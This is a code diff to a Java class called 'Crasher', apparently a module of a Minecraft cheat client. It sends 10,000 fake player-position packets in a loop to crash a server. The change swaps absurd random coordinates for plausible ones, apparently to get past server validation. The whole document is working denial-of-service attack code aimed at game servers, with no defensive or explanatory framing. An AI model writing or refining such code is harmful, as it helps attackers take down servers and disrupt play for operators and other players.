@@ -32,7 +32,7 @@ public class Crasher extends Module {
 		if (this.loop > 6) {
 			int spam = 0;
 			while (spam < 10000) {
-				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*10000000+10000000), (Math.random()*10000000+10000000), (Math.random()*10000000+10000000), true));
+				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*30000+5000), (Math.random()*100+10), (Math.random()*30000+5000), true));
 				++spam;
 				this.loop = 0;
 			}
